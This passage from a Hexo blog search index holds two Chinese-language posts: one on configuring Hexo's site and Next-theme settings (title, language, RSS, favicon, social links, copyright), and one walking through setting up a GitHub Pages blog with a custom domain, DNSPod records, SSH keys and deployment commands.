    <content type="text"><![CDATA[通过GitHub Page + Hexo(Next主题)搭建好博客之后，需要对站点配置文件、主题配置文件进行自定义配置。本篇文章对一些常用或需要自定义的配置进行描述。站点配置站点配置文件为全局配置文件，影响整个站点。文件路径:\根目录\_config.yml。基础配置站点基础配置包括标题、副标题、描述、作者、站点语言、URL设置等。通过对基础配置进行修改，就可以完成大部分的”轻度折腾”。标题标题会影响整站的标题，并且会在显示页面上。1title: 站点标题副标题副标题位于在主标题下，在Next主题中会被隐藏，需要通过修改\根目录\themes\next\source\css\_schemes\Mist\_logo.styl的.site-subtitile字段的display值或者在.site-subtitle前面加#进行注释。1subtitle: 站点副标题描述描述位于站点概览中，用最”简单”的语言描述一下最棒的自己。1description: 最简单的语言作者作者位于站点概览、版本声明等位置，留下自己的大名，让自己”声名远扬”吧！1author: 最棒的自己站点语言站点语言会影响整个站点的显示语言。支持简中、繁中、英文等。1language: zh-Hans|语言 |对应值 | |English |en | |简体中文 |zh-Hans | |法语 |fr-FR ｜ |繁体中文 |zh-hk/zh-tw｜ |俄语 |ru ｜ |德语 |de ｜ |葡萄牙语 |pt ｜ |日语 |ja ｜ URL设置URL设置包括url、enforce_ssl、root、permalink、permalink_default等字段。其中url字段设置为博客域名。根据博客所处目录设置root，如果为子目录，root需要进行对应修改。其余字段可保持不变。12url: 你的域名root: 站点所处目录其他配置分页设置分页设置主要修改per_page字段，可以对主页、档案、标签等进行每页显示文章数设置。1234567891011index_generator: path: '' per_page: 5 order_by: -datearchive_generator: per_page: 20 yearly: true monthly: truetag_generator: per_page: 10per_page: 10RSSRSS位于站点概览中，可以通过安装插件来完成，安装hexo-generator-feed。1npm install hexo-generator-feed --save安装插件之后，通过配置plugin字段加载插件。12plugin: - hexo-generator-feed对feed字段进行配置，如果不存在，则新建feed字段。123456feed: type: atom path: atom.xml limit: 10 hub: content:主题设置下载喜欢的主题，通过修改theme字段进行更换主题。Next主题下载，也可以在hexo提供的主题下载页面寻找喜欢的主题。1theme: next主题配置这里介绍Next的主题配置，主题配置文件文件路径:\根目录\themes\next\_config.yml。站标站标位于标签页左边,路径指向source目录下。建议ico大小为32x32。在线制作链接。1favicon: /iamges/favicon.ico社交社交位于站点概览，可以添加GitHub、知乎、微博、豆瓣等社交链接。12social: GitHub: https://github.com/hywell社交ico可以在图标库中查找，通过配置social_icons字段进行定义。123social_icons: enable: true GitHub: github打赏打赏位于每篇文章底部，可以添加微信、支付宝二维码，并设置感谢语。123reward_comment: 感谢语wechatpay: /images/wechatpay.jpgalipay: /images/alipay.jpg友链友情链接位于站点概览，可以设置links标题、友链名称、友链链接等。123links_title: 友情链接links: GitHub: https://github.com微信二维码微信二维码位于每篇文章底部。有朋自远方来，不亦乐乎！1234wechat_subscriber: enabled: true qcode: /images/wechat.jpg description: 有朋自远方来,不亦乐乎！版权版权信息位于每篇文章底部，表明作者、链接、版权声明。1234post_copyright: enable: true license: CC BY-NC-SA 3.0 license_url: https://creativecommons.org/licenses/by-nc-sa/3.0/结尾通过对以上参数进行配置，相信现在的博客已经开始呈现出一丝丝的与众不同了吧。生命在于折腾，折腾了博客搭建、折腾了博客配置，接下来开始折腾博客美化了。]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[搭建博客]]></title>
    <url>%2Farchives%2F5c83b0d3.html</url>
    <content type="text"><![CDATA[第一次搭建博客，一开始选用GitHub Page + jekyll 从网上找了许多模板，也自己去尝试写，发现总是不如人意。后来，改用GitHub Page + Hexo,套用Next主题满足了折腾的”愿望”。准备Hexo安装Hexo需要先安装Nodejs、Git。安装Git从Git官网下载对应系统版本进行安装Download。我是Windows系统，因此下载Windows版本。打开终端，输入1git --version查看对应版本，如果成功输出版本信息代表完成安装。安装Nodejs从Nodejs官网下载对应系统版本安装Download。我是Windows系统，因此下载Windows版本。打开终端，输入1npm -v查看对应版本，如果成功输出版本信息代表完成安装。安装hexo以管理员权限打开终端，进入对应目录（以E:\hexo为例）输入1E:\hexo&gt;npm install -g hexo安装途中出现会可能WARN不用担心。域名（可选）GitHub Page可以通过配置，让其可通过自定义域名进行访问（例如通过iassas.com即可访问我的博客）。建议通过GoDaddy申请，输入心仪的域名点击搜索域名。如果域名未被注册，将其添加到购物车。进入购物车进行付款。付款途中根据需要，添加增值服务。DNS解析（可选）为了让博客更好、更快地访问就需要配置DNS。建议通过DNSPOD申请，免费注册一个账户之后进入个人管理界面。选择左边菜单栏的[域名解析]，添加一个域名，输入自己的域名（例如iassas.com），点击确定。点击iassas.com进行配置，点击添加记录，共添加三条记录，添加以下信息进行保存即可。下述第三条www记录中的记录值需要输入对应的github.io（如果没有，请看下一小节）。| 主机记录 |记录类型 |线路类型 | 记 录 值 | | @ | A |默认 |192.30.252.153 | | @ | A |默认 |192.30.252.154 | | www | CNAME |默认 |user.github.io | 修改域名服务器，以GoDaddy结合DNSPOD为例。登陆GoDaddy，点击我的产品。选择对应的域名，点击DNS。在域名服务器项中，使用自定义域名服务器。配置如下| 域 名 服 务 器 | |f1g1ns1.dnspod.net | |f1g1ns2.dnspod.net | GitHub PageGitHub Page需要先注册一个GitHub账号GitHub。进入个人主页（例如https://github.com/hywell，是我的主页），点击右上角+号，点击New repository新建库。库名需要以账号名.github.io命名（例如hywell.github.io)，权限选择Public。点击下方Create repository建立库。建站创建博客打开终端，输入12E:\hexo&gt;hexo init blogE:\hexo&gt;npm install成功创建一个站点。进入站点目录，输入清理、编译、本地运行:123E:\hexo\blog&gt;hexo cleanE:\hexo\blog&gt;hexo gE:\hexo\blog&gt;hexo s这时候就可以通过浏览器访问127.0.0.1:4000，见证效果了！更换主题（可选）本博客套用Next主题，也可自行下载别的主题。打开终端，输入1E:\hexo\blog&gt;git clone https://github.com/iissnan/hexo-theme-next themes/next博客配置博客配置文件有站点配置文件、主题配置文件。站点配置文件为博客根目录下的_config.yml文件(E:\hexo\blog\_config.yml)，主题配置文件为\themes\主题_config.yml文件(E:\hexo\blog\themes\next\_config.yml)。需要注意的是在修改配置时，配置值前面需要加一个空格。以配置名: 配置值的形式，例如：title: blog。这里简要的介绍一些配置。站点配置修改主题，通过修改站点配置文件的theme字段，将其修改成对应的值 theme: next。修改站点标题，通过修改站点配置文件的title字段，将其修改成对应的值 title: Blog。修改站点语言，通过修改站点配置文件的language字段，将其修改成对应的值language: zh-Hans。修改时区，通过修改站点配置文件的timezone字段，将其修改成对应的值timezone: Asia/Shanghai。主题配置修改图标，通过修改主题配置文件的favicon字段，将其修改成对应的值favicon: /images/favicon.ico。这里的路径为/themes/next/source/images/favicon.ico，如果没有对应文件，则需要新建。修改头像，通过修改主题配置文件的avatar，将其修改成对应的值avatar: /upload/avatar.png。这里的路径为/themes/next/source/upload/avatar.png，如果没有对应文件，则需要新建。部署GitHub部署使用GitBash(\Git\git-bash.exe)配置身份信息，在GitBash中输入123git config --global user.name "yourname"git config --global user.email "youremail"ssh-keygen -t rsa -C "youremail"在用户目录下找到.ssh文件夹(C:\user\youname.ssh)，将id_rsa.pub中的密钥复制到GitHub-Setting-Key中。点击New SSH key，添加一个新的SSH key：输入任意title、将id_rsa.pub内容粘贴到Key中，最后点击 Add SSH key。登录GitHub。对刚刚新建的库（账号名.github.io）进行设置。将Custom domain设置为从GoDaddy申请的域名。站点部署配置站点配置文件的Deployment字段，将其修改。1234deploy: type: git repo: git@github.com:yourname/yourname.github.io.git branch: master如果出现Deployer not found，请输入1E:\hexo\blog\npm install hexo-deployer-git --save上传blog。123E:\hexo\blog\hexo cleanE:\hexo\blog\hexo gE:\hexo\blog\hexo d完成这时候通过账户名.github.io 或者 申请的域名即可访问你的博客了！！]]></content>
      <categories>
        <category>Blog</category>
      </categories>
      <tags>
        <tag>博客</tag>
      </tags>
  </entry>
</search>
